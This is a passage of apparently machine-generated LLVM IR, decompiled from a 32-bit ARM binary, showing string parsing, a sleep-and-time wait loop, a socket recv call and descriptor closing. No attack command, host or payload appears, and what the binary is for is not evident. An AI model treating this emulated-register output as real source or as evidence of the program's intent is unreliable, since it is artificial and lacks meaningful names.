  %v1_a46c = add i32 %v2_a464, -20736
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v7_a470 = icmp sgt i32 %v5_a44c, 1
  br i1 %v7_a470, label %bb229, label %bb230

bb229:                                            ; preds = %dec_label_pc_a45c
  %v9_a470 = add i32 %v5_a44c, -2
  store i32 %v9_a470, i32* @r7, align 4
  br label %bb230

bb230:                                            ; preds = %dec_label_pc_a45c, %bb229
  %v3_a47c = phi i32 [ %v5_a44c, %dec_label_pc_a45c ], [ %v9_a470, %bb229 ]
  %v1_a474 = add i32 %v2_a464, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_a47c = add i32 %v1_a474, %v3_a47c
  %v5_a47c = inttoptr i32 %v4_a47c to i8*
  store i8 0, i8* %v5_a47c, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v1_a490 = load i32, i32* @r4, align 4
  %v2_a490 = add i32 %v1_a490, %v2_8fd8
  %v3_a490 = inttoptr i32 %v2_a490 to i8*
  %v4_a490 = load i8, i8* %v3_a490, align 1
  %v6_a490 = zext i8 %v4_a490 to i32
  store i32 %v6_a490, i32* %r0.global-to-local, align 4
  %v1_a494 = add nsw i32 %v6_a490, -48
  store i32 %v1_a494, i32* %r3.global-to-local, align 4
  %v2_a498 = icmp ugt i32 %v1_a494, 8
  store i1 %v2_a498, i1* %cpsr_c.global-to-local, align 1
  %v3_a498 = sub nsw i32 56, %v6_a490
  %v4_a498 = and i32 %v3_a498, %v1_a494
  %v5_a498 = icmp slt i32 %v4_a498, 0
  store i1 %v5_a498, i1* %cpsr_v.global-to-local, align 1
  %v6_a498 = icmp ult i8 %v4_a490, 57
  store i1 %v6_a498, i1* %cpsr_n.global-to-local, align 1
  %v7_a498 = icmp eq i32 %v1_a494, 9
  store i1 %v7_a498, i1* %cpsr_z.global-to-local, align 1
  %v2_a49c = xor i1 %v7_a498, true
  %v3_a49c = and i1 %v2_a498, %v2_a49c
  br i1 %v3_a49c, label %.thread139, label %dec_label_pc_a4a4

.thread139:                                       ; preds = %bb230
  %v4_a49c = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4cc

dec_label_pc_a4a4:                                ; preds = %bb230
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a4b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a4a4
  %v0_a4a8 = phi i32 [ %v1_a4a8, %dec_label_pc_a4a8 ], [ 0, %dec_label_pc_a4a4 ]
  %v1_a4a8 = add i32 %v0_a4a8, 1
  store i32 %v1_a4a8, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v2_a4b4 = add i32 %v1_a4a8, %v1_a4b4.pre
  %v3_a4b4 = inttoptr i32 %v2_a4b4 to i8*
  %v4_a4b4 = load i8, i8* %v3_a4b4, align 1
  %v6_a4b4 = zext i8 %v4_a4b4 to i32
  store i32 %v6_a4b4, i32* %r0.global-to-local, align 4
  %v1_a4b8 = add nsw i32 %v6_a4b4, -48
  %v2_a4bc = icmp ugt i32 %v1_a4b8, 8
  store i1 %v2_a4bc, i1* %cpsr_c.global-to-local, align 1
  %v3_a4bc = sub nsw i32 56, %v6_a4b4
  %v4_a4bc = and i32 %v3_a4bc, %v1_a4b8
  %v5_a4bc = icmp slt i32 %v4_a4bc, 0
  store i1 %v5_a4bc, i1* %cpsr_v.global-to-local, align 1
  %v6_a4bc = icmp ult i8 %v4_a4b4, 57
  store i1 %v6_a4bc, i1* %cpsr_n.global-to-local, align 1
  %v7_a4bc = icmp eq i32 %v1_a4b8, 9
  store i1 %v7_a4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a4a8, i32* %r3.global-to-local, align 4
  %v2_a4c4 = xor i1 %v2_a4bc, true
  %v3_a4c4 = or i1 %v7_a4bc, %v2_a4c4
  br i1 %v3_a4c4, label %dec_label_pc_a4a8, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a8, %.thread139
  %v2_a4d8 = phi i32 [ %v4_a49c, %.thread139 ], [ %v2_a4b4, %dec_label_pc_a4a8 ]
  %v0_a4cc = phi i32 [ %v6_a490, %.thread139 ], [ %v6_a4b4, %dec_label_pc_a4a8 ]
  %stack_var_-40.16 = phi i32 [ 0, %.thread139 ], [ %v1_a4a8, %dec_label_pc_a4a8 ]
  store i32 %v2_a4d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a4cc = icmp eq i32 %v0_a4cc, 0
  store i1 %v2_a4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4cc, label %dec_label_pc_a618, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4cc
  store i32 0, i32* @r5, align 4
  %v3_a4d8 = inttoptr i32 %v2_a4d8 to i8*
  store i8 0, i8* %v3_a4d8, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v1_a4e4 = add i32 %stack_var_-40.16, 1
  store i32 %v1_a4e4, i32* %ip.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r6, align 4
  %v2_a4ec = add i32 %v0_a4ec, %v1_a4e4
  %v3_a4ec = inttoptr i32 %v2_a4ec to i8*
  %v4_a4ec = load i8, i8* %v3_a4ec, align 1
  %v6_a4ec = zext i8 %v4_a4ec to i32
  store i32 %v6_a4ec, i32* %r3.global-to-local, align 4
  %v2_a4f0 = icmp ugt i8 %v4_a4ec, 31
  store i1 %v2_a4f0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a4f0 = icmp ult i8 %v4_a4ec, 32
  store i1 %v6_a4f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a4f0 = icmp eq i8 %v4_a4ec, 32
  store i1 %v7_a4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4f0, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_a4d4
  %v2_a4f4 = add i32 %stack_var_-40.16, 2
  store i32 %v2_a4f4, i32* %ip.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_a4d4, %bb231
  %v1_a4f8 = phi i32 [ %v1_a4e4, %dec_label_pc_a4d4 ], [ %v2_a4f4, %bb231 ]
  %v2_a4f8 = add i32 %v1_a4f8, %v0_a4ec
  store i32 %v2_a4f8, i32* @r4, align 4
  %v1_a4fc.v1_a4e4 = select i1 %v7_a4f0, i32 %v1_a4f8, i32 %v1_a4e4
  store i32 %v2_a4f8, i32* %r0.global-to-local, align 4
  %v1_a504 = inttoptr i32 %v2_a4f8 to i8*
  %v2_a504 = call i32 @function_13a08(i8* %v1_a504)
  store i32 ptrtoint ([5 x i8]* @global_var_14394.101 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a504, i32* @r1, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v4_a514 = inttoptr i32 %v0_a510 to i8*
  %v5_a514 = call i32 @function_13d5c(i8* %v4_a514, i32 %v2_a504, i32 ptrtoint ([5 x i8]* @global_var_14394.101 to i32))
  store i32 %v5_a514, i32* %r0.global-to-local, align 4
  %v1_a518 = add i32 %v5_a514, 1
  %v2_a518 = icmp eq i32 %v5_a514, -1
  store i1 %v2_a518, i1* %cpsr_c.global-to-local, align 1
  %v3_a518 = sub i32 0, %v5_a514
  %v4_a518 = and i32 %v1_a518, %v3_a518
  %v5_a518 = icmp slt i32 %v4_a518, 0
  store i1 %v5_a518, i1* %cpsr_v.global-to-local, align 1
  %v6_a518 = icmp slt i32 %v1_a518, 0
  store i1 %v6_a518, i1* %cpsr_n.global-to-local, align 1
  %v7_a518 = icmp eq i32 %v1_a518, 0
  store i1 %v7_a518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a518, label %.thread54, label %dec_label_pc_a528

.thread54:                                        ; preds = %bb232
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v4_a520 = load i32, i32* %v11_904c, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a528:                                ; preds = %bb232
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v0_a530 = load i32, i32* @r6, align 4
  %v2_a530 = add i32 %v0_a530, %v1_a4fc.v1_a4e4
  store i32 %v2_a530, i32* @r4, align 4
  store i32 %v2_a530, i32* %r0.global-to-local, align 4
  %v1_a538 = inttoptr i32 %v2_a530 to i8*
  %v2_a538 = call i32 @function_13a08(i8* %v1_a538)
  store i32 ptrtoint ([5 x i8]* @global_var_14394.101 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a538, i32* @r1, align 4
  %v0_a544 = load i32, i32* @r4, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v4_a548 = inttoptr i32 %v0_a544 to i8*
  %v5_a548 = call i32 @function_13d5c(i8* %v4_a548, i32 %v2_a538, i32 ptrtoint ([5 x i8]* @global_var_14394.101 to i32))
  store i32 %v5_a548, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v2_a554 = add i32 %v5_a548, %v1_a4fc.v1_a4e4
  br label %dec_label_pc_a55c

dec_label_pc_a55c:                                ; preds = %.thread54, %dec_label_pc_a528
  %stack_var_-40.18 = phi i32 [ %v2_a554, %dec_label_pc_a528 ], [ %v1_a4fc.v1_a4e4, %.thread54 ]
  %storemerge147 = phi i32 [ %v2_a554, %dec_label_pc_a528 ], [ %v4_a520, %.thread54 ]
  store i32 %storemerge147, i32* %ip.global-to-local, align 4
  %v0_a55c = load i32, i32* @r6, align 4
  %v2_a55c = add i32 %v0_a55c, %storemerge147
  %v3_a55c = inttoptr i32 %v2_a55c to i8*
  %v4_a55c = load i8, i8* %v3_a55c, align 1
  %v6_a55c = zext i8 %v4_a55c to i32
  store i32 %v6_a55c, i32* %r3.global-to-local, align 4
  %v2_a560 = icmp ugt i8 %v4_a55c, 33
  store i1 %v2_a560, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a560 = icmp ult i8 %v4_a55c, 34
  store i1 %v6_a560, i1* %cpsr_n.global-to-local, align 1
  %v7_a560 = icmp eq i8 %v4_a55c, 34
  store i1 %v7_a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a560, label %dec_label_pc_aae4, label %dec_label_pc_a568

dec_label_pc_a568:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_a55c, %dec_label_pc_ab0c
  %stack_var_-40.19 = phi i32 [ %v1_aae4, %dec_label_pc_ab0c ], [ %v1_aae4, %dec_label_pc_aae4 ], [ %stack_var_-40.18, %dec_label_pc_a55c ]
  %v0_a568 = load i32, i32* @r6, align 4
  store i32 %v0_a568, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a570 = inttoptr i32 %v0_a568 to i8*
  %v3_a570 = call i32 @function_13b34(i8* %v2_a570, i32 10)
  store i32 %v3_a570, i32* %r0.global-to-local, align 4
  %v1_a574 = add i32 %v3_a570, -1
  store i32 %v1_a574, i32* %r3.global-to-local, align 4
  %v1_a578 = add i32 %v3_a570, -9
  %v2_a578 = icmp ugt i32 %v1_a574, 7
  store i1 %v2_a578, i1* %cpsr_c.global-to-local, align 1
  %v3_a578 = sub i32 8, %v3_a570
  %v4_a578 = and i32 %v3_a578, %v1_a574
  %v5_a578 = icmp slt i32 %v4_a578, 0
  store i1 %v5_a578, i1* %cpsr_v.global-to-local, align 1
  %v6_a578 = icmp slt i32 %v1_a578, 0
  store i1 %v6_a578, i1* %cpsr_n.global-to-local, align 1
  %v7_a578 = icmp eq i32 %v1_a574, 8
  store i1 %v7_a578, i1* %cpsr_z.global-to-local, align 1
  %v2_a57c = xor i1 %v2_a578, true
  %v3_a57c = or i1 %v7_a578, %v2_a57c
  br i1 %v3_a57c, label %dec_label_pc_a590.preheader, label %dec_label_pc_a5a4

dec_label_pc_a590.preheader:                      ; preds = %dec_label_pc_a568
  store i32 %v2_9530, i32* %ip.global-to-local, align 4
  %v6_a580 = add i32 %v3_a570, %v2_9530
  store i32 %v6_a580, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a590
  %v1_a58c = call i32 @_sleep(i32 1)
  store i32 %v1_a58c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %dec_label_pc_a590.preheader, %dec_label_pc_a58c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a594 = call i32 @time(i32* null)
  %v1_a598 = load i32, i32* %r4.global-to-local, align 4
  %v2_a598 = sub i32 %v2_a594, %v1_a598
  %v3_a598 = icmp uge i32 %v2_a594, %v1_a598
  store i1 %v3_a598, i1* %cpsr_c.global-to-local, align 1
  %v4_a598 = xor i32 %v1_a598, %v2_a594
  %v5_a598 = xor i32 %v2_a598, %v2_a594
  %v6_a598 = and i32 %v5_a598, %v4_a598
  %v7_a598 = icmp slt i32 %v6_a598, 0
  store i1 %v7_a598, i1* %cpsr_v.global-to-local, align 1
  %v8_a598 = icmp slt i32 %v2_a598, 0
  store i1 %v8_a598, i1* %cpsr_n.global-to-local, align 1
  %v9_a598 = icmp eq i32 %v2_a594, %v1_a598
  store i1 %v9_a598, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_a598, label %dec_label_pc_a5a4, label %dec_label_pc_a58c

dec_label_pc_a5a4:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a568
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %stack_var_-40.19, i32* @r4, align 4
  %v0_a5ac = load i32, i32* @r6, align 4
  %v2_a5ac = add i32 %v0_a5ac, %stack_var_-40.19
  store i32 %v2_a5ac, i32* @r5, align 4
  store i32 %v2_a5ac, i32* %r0.global-to-local, align 4
  %v1_a5b4 = inttoptr i32 %v2_a5ac to i8*
  %v2_a5b4 = call i32 @function_13a08(i8* %v1_a5b4)
  store i32 ptrtoint ([5 x i8]* @global_var_1438c.99 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5b4, i32* @r1, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v4_a5c4 = inttoptr i32 %v0_a5c0 to i8*
  %v5_a5c4 = call i32 @function_13d5c(i8* %v4_a5c4, i32 %v2_a5b4, i32 ptrtoint ([5 x i8]* @global_var_1438c.99 to i32))
  store i32 %v5_a5c4, i32* %r0.global-to-local, align 4
  %v1_a5c8 = add i32 %v5_a5c4, -4
  %v2_a5c8 = icmp ugt i32 %v5_a5c4, 3
  store i1 %v2_a5c8, i1* %cpsr_c.global-to-local, align 1
  %v3_a5c8 = sub i32 3, %v5_a5c4
  %v4_a5c8 = and i32 %v3_a5c8, %v5_a5c4
  %v5_a5c8 = icmp slt i32 %v4_a5c8, 0
  store i1 %v5_a5c8, i1* %cpsr_v.global-to-local, align 1
  %v6_a5c8 = icmp slt i32 %v1_a5c8, 0
  store i1 %v6_a5c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a5c8 = icmp eq i32 %v5_a5c4, 4
  store i1 %v7_a5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5c8, label %dec_label_pc_a9c0, label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5a4
  %v0_a5d0 = load i32, i32* @r6, align 4
  %v1_a5d0 = load i32, i32* @r4, align 4
  %v2_a5d0 = add i32 %v1_a5d0, %v0_a5d0
  %v3_a5d0 = inttoptr i32 %v2_a5d0 to i8*
  %v4_a5d0 = load i8, i8* %v3_a5d0, align 1
  %v6_a5d0 = zext i8 %v4_a5d0 to i32
  store i32 %v6_a5d0, i32* %r3.global-to-local, align 4
  %v2_a5d4 = icmp ugt i8 %v4_a5d0, 46
  store i1 %v2_a5d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a5d4 = icmp ult i8 %v4_a5d0, 47
  store i1 %v6_a5d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a5d4 = icmp eq i8 %v4_a5d0, 47
  store i1 %v7_a5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5d4, label %dec_label_pc_ab38, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_ab38, %dec_label_pc_aa90, %dec_label_pc_aa74, %dec_label_pc_a5d0, %dec_label_pc_ab84, %dec_label_pc_aac0
  %stack_var_-40.20 = phi i32 [ %stack_var_-40.26, %dec_label_pc_aa74 ], [ %stack_var_-40.26, %dec_label_pc_aa90 ], [ %stack_var_-40.26, %dec_label_pc_aac0 ], [ %stack_var_-40.19, %dec_label_pc_ab38 ], [ %stack_var_-40.19, %dec_label_pc_ab54 ], [ %stack_var_-40.19, %dec_label_pc_ab84 ], [ %stack_var_-40.19, %dec_label_pc_a5d0 ]
  %v0_a5dc = load i32, i32* %sb.global-to-local, align 4
  %v1_a5e0 = add i32 %v0_a5dc, 1431
  store i32 %v1_a5e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_a5ec = call i32 @_memcpy(i32 %v1_a5e0, i32 ptrtoint ([4 x i8]* @global_var_14368.76 to i32), i32 4)
  store i32 %v4_a5ec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a5f4 = load i32, i32* @r8, align 4
  %v3_a5f4 = add i32 %v2_a5f4, -1452
  %v4_a5f4 = inttoptr i32 %v3_a5f4 to i8*
  store i8 10, i8* %v4_a5f4, align 1
  br label %dec_label_pc_9590

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_9368
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  %v1_a600 = trunc i32 %v1_9368 to i8
  store i8 %v1_a600, i8* %v2_93a8, align 1
  %v0_a604 = load i32, i32* @r6, align 4
  %v1_a604 = add i32 %v0_a604, -1431
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  %v3_a604 = load i32, i32* %v2_a604, align 4
  store i32 %v3_a604, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @close(i32 %v3_a604)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_a610 = load i32, i32* @r6, align 4
  %v2_a610 = add i32 %v1_a610, -1431
  %v3_a610 = inttoptr i32 %v2_a610 to i32*
  store i32 -1, i32* %v3_a610, align 4
  br label %dec_label_pc_9388

dec_label_pc_a618:                                ; preds = %dec_label_pc_a4cc, %dec_label_pc_a3fc, %dec_label_pc_a3d0
  %stack_var_-40.21 = phi i32 [ %stack_var_-40.11, %dec_label_pc_a3d0 ], [ %stack_var_-40.11, %dec_label_pc_a3fc ], [ %stack_var_-40.16, %dec_label_pc_a4cc ]
  %v0_a618 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_a628 = call i32 @function_13acc(i32 %v2_8fd8, i32 %v0_a618, i32 ptrtoint ([5 x i8]* @global_var_14380.95 to i32), i32 4)
  %v0_a62c = load i32, i32* %sb.global-to-local, align 4
  %v1_a630 = add i32 %v0_a62c, 1431
  store i32 %v1_a630, i32* @r4, align 4
  store i32 %v5_a628, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1439c.103 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a630, i32* %r0.global-to-local, align 4
  %v3_a640 = inttoptr i32 %v1_a630 to i8*
  %v4_a640 = call i32 @function_13de8(i8* %v3_a640, i32 ptrtoint ([5 x i8]* @global_var_1439c.103 to i32))
  store i32 %v4_a640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a644 = icmp slt i32 %v4_a640, 0
  store i1 %v1_a644, i1* %cpsr_n.global-to-local, align 1
  %v2_a644 = icmp eq i32 %v4_a640, 0
  store i1 %v2_a644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a644, label %dec_label_pc_a800, label %dec_label_pc_a64c

dec_label_pc_a64c:                                ; preds = %dec_label_pc_a800, %dec_label_pc_a618
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, -1452
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 7, i8* %v4_a650, align 1
  br label %dec_label_pc_a654

dec_label_pc_a654:                                ; preds = %bb239, %dec_label_pc_a64c
  %v0_a654 = load i32, i32* @r5, align 4
  store i32 %v0_a654, i32* %r2.global-to-local, align 4
  %v0_a658 = load i32, i32* @r8, align 4
  %v1_a658 = add i32 %v0_a658, -1456
  %v2_a658 = inttoptr i32 %v1_a658 to i32*
  %v3_a658 = load i32, i32* %v2_a658, align 4
  store i32 %v3_a658, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a664 = call i32 @_recv(i32 %v3_a658, i32 %v2_8fd8, i32 %v0_a654, i32 16384)
  store i32 %v4_a664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9590

dec_label_pc_a66c:                                ; preds = %dec_label_pc_9b5c
  %v2_a66c = add i32 %v0_a66c, -10240
  %v3_a66c = icmp ugt i32 %v0_a66c, 10239
  store i1 %v3_a66c, i1* %cpsr_c.global-to-local, align 1
  %v4_a66c = sub i32 10239, %v0_a66c
  %v5_a66c = and i32 %v4_a66c, %v0_a66c
  %v6_a66c = icmp slt i32 %v5_a66c, 0
  store i1 %v6_a66c, i1* %cpsr_v.global-to-local, align 1
  %v7_a66c = icmp slt i32 %v2_a66c, 0
  store i1 %v7_a66c, i1* %cpsr_n.global-to-local, align 1
  %v8_a66c = icmp eq i32 %v0_a66c, 10240
  store i1 %v8_a66c, i1* %cpsr_z.global-to-local, align 1
  %v5_a670 = icmp slt i32 %v0_a66c, 10240
  br i1 %v5_a670, label %dec_label_pc_9590, label %dec_label_pc_9b78

dec_label_pc_a678:                                ; preds = %dec_label_pc_a380
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a67c = load i32, i32* @r4, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 104, i32* %v2_a67c, align 4
  br label %dec_label_pc_a3b4

dec_label_pc_a684:                                ; preds = %dec_label_pc_a188
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* %fp.global-to-local, align 4
  %v2_a688 = inttoptr i32 %v1_a688 to i32*
  store i32 104, i32* %v2_a688, align 4
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6a8, %dec_label_pc_a684
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, -1456
  %v2_a68c = inttoptr i32 %v1_a68c to i32*
  %v3_a68c = load i32, i32* %v2_a68c, align 4
  store i32 %v3_a68c, i32* %r0.global-to-local, align 4
  %v1_a690 = call i32 @close(i32 %v3_a68c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a69c = load i32, i32* @r8, align 4
  %v2_a69c = add i32 %v1_a69c, -1456
  %v3_a69c = inttoptr i32 %v2_a69c to i32*
  store i32 -1, i32* %v3_a69c, align 4
  %v0_a6a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_a6a0 = trunc i32 %v0_a6a0 to i8
  %v2_a6a0 = load i32, i32* @r8, align 4
  %v3_a6a0 = add i32 %v2_a6a0, -1452
  %v4_a6a0 = inttoptr i32 %v3_a6a0 to i8*
  store i8 %v1_a6a0, i8* %v4_a6a0, align 1
  br label %dec_label_pc_9590

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a1b0
  %v0_a6a8 = load i32, i32* %fp.global-to-local, align 4
  %v1_a6a8 = inttoptr i32 %v0_a6a8 to i32*
  %v2_a6a8 = load i32, i32* %v1_a6a8, align 4
  store i32 %v2_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = add i32 %v2_a6a8, -11
  %v2_a6ac = icmp ugt i32 %v2_a6a8, 10
  store i1 %v2_a6ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a6ac = sub i32 10, %v2_a6a8
  %v4_a6ac = and i32 %v3_a6ac, %v2_a6a8
  %v5_a6ac = icmp slt i32 %v4_a6ac, 0
  store i1 %v5_a6ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a6ac = icmp slt i32 %v1_a6ac, 0
  store i1 %v6_a6ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a6ac = icmp eq i32 %v2_a6a8, 11
  store i1 %v7_a6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ac, label %dec_label_pc_9590, label %dec_label_pc_a68c

dec_label_pc_a6b8:                                ; preds = %bb228
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v0_a6c4 = load i32, i32* @r5, align 4
  %v1_a6c4 = add i32 %v0_a6c4, 4
  %v2_a6c4 = inttoptr i32 %v1_a6c4 to i8*
  %v3_a6c4 = load i8, i8* %v2_a6c4, align 1
  %v4_a6c4 = zext i8 %v3_a6c4 to i32
  store i32 %v4_a6c4, i32* %r3.global-to-local, align 4
  %v2_a6c8 = icmp ugt i8 %v3_a6c4, 114
  store i1 %v2_a6c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a6c8 = icmp ult i8 %v3_a6c4, 115
  store i1 %v6_a6c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a6c8 = icmp eq i8 %v3_a6c4, 115
  store i1 %v7_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c8, label %bb233, label %bb234

bb233:                                            ; preds = %dec_label_pc_a6b8
  store i32 8, i32* %ip.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %dec_label_pc_a6b8, %bb233
  %v1_a6d0 = phi i32 [ 7, %dec_label_pc_a6b8 ], [ 8, %bb233 ]
  %v1_a6d0. = select i1 %v7_a6c8, i32 %v1_a6d0, i32 7
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 %v0_a6c4, i32* %r0.global-to-local, align 4
  %v1_a6e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_a6e0 = sub i32 %v1_a6e0, %v1_a6d0.
  store i32 %v2_a6e0, i32* %r2.global-to-local, align 4
  %v2_a6e4 = add i32 %v1_a6d0., %v0_a6c4
  store i32 %v2_a6e4, i32* %r1.global-to-local, align 4
  %v3_a6e8 = call i32 @_memmove(i32 %v0_a6c4, i32 %v2_a6e4, i32 %v2_a6e0)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r7, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v1_a6f8 = load i32, i32* @r4, align 4
  %v2_a6f8 = add i32 %v1_a6f8, %v2_8fd8
  %v3_a6f8 = inttoptr i32 %v2_a6f8 to i8*
  %v4_a6f8 = load i8, i8* %v3_a6f8, align 1
  %v6_a6f8 = zext i8 %v4_a6f8 to i32
  store i32 %v6_a6f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a6fc = icmp eq i8 %v4_a6f8, 0
  store i1 %v2_a6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6fc, label %dec_label_pc_a740, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %bb234
  %v2_a704 = icmp ugt i8 %v4_a6f8, 46
  store i1 %v2_a704, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a704 = icmp ult i8 %v4_a6f8, 47
  store i1 %v6_a704, i1* %cpsr_n.global-to-local, align 1
  %v7_a704 = icmp eq i8 %v4_a6f8, 47
  store i1 %v7_a704, i1* %cpsr_z.global-to-local, align 1
  %v1_a708 = load i32, i32* @r5, align 4
  br i1 %v7_a704, label %bb235, label %dec_label_pc_a710

bb235:                                            ; preds = %dec_label_pc_a704
  store i32 %v1_a708, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a8a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a720

dec_label_pc_a718:                                ; preds = %dec_label_pc_a720
  %v2_a718 = icmp ugt i8 %v4_a72c, 46
  store i1 %v2_a718, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a718 = icmp ult i8 %v4_a72c, 47
